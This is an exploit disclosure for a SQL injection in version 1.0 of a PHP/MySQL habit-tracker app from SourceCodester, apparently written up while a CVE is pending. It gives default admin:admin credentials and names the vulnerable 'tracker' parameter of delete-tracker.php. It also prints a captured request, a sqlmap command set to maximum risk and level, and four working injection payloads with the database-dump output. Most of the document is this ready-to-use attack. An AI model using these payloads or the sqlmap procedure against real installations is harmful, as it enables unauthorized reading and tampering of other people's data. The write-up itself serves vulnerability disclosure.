# Daily_Habit_Tracker_App_SQL_Injection
+ **Exploit Title:** Daily_Habit_Tracker_App_SQL_Injection
+ **Date:** 2024-22-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17118&title=Daily+Habit+Tracker+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Daily Habit Tracker App 1.0 allows SQL Injection via parameter 'tracker' in "habit-tracker/endpoint/delete-tracker.php?tracker=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: `http://localhost/habit-tracker/index.php`
+ Fill in the User ID and Password with `admin`:`admin` and log in.
+ Press the Delete Tracker button : `/habit-tracker/endpoint/delete-tracker.php?tracker=1`
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy and paste the request into an "r.txt" file.
+ Captured Burp request:
```
GET /habit-tracker/endpoint/delete-tracker.php?tracker=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
+ Use sqlmap to exploit. In sqlmap, use 'tracker' parameter to dump the database. 
``` 
sqlmap -r r.txt -p tracker --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: tracker (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: tracker=1' RLIKE (SELECT (CASE WHEN (5827=5827) THEN 1 ELSE 0x28 END))-- TFvZ

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: tracker=1' AND EXTRACTVALUE(7688,CONCAT(0x5c,0x71626a6a71,(SELECT (ELT(7688=7688,1))),0x7162767871))-- TWCh

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: tracker=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tracker=1' AND (SELECT 5872 FROM (SELECT(SLEEP(5)))IpgR)-- ZIFP
---
[16:39:44] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[16:39:44] [INFO] fetching current database
[16:39:44] [INFO] retrieved: 'habit_tracker_db'
current database: 'habit_tracker_db'
```
+ current database: `habit_tracker_db`

![Ekran görüntüsü 2024-01-22 012431](https://github.com/BurakSevben/Daily_Habit_Tracker_SQL_Injection/assets/117217689/dc4211dc-de6d-431b-aa23-45390e4796bc)


